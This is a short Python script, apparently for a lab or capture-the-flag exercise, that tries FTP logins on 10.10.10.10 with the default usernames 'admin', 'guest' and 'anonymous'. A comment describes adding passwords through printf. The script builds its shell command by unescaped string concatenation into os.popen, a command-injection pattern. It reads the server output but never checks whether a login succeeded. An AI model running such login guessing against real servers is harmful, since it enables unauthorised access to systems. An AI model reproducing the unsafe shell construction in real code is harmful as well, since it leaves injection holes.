#!/usr/bin/python3

import os

#add names below
names = ["admin", "guest", "anonymous"]

for name in names:
    print(" [*] Trying " + str(name))

    #You can add passwords to this by using
    #printf "username\npassword\n" | ftp name_of_website
    
    command = 'printf "' + name + '" | ftp 10.10.10.10'
    stream = os.popen(command)
    output = stream.read()

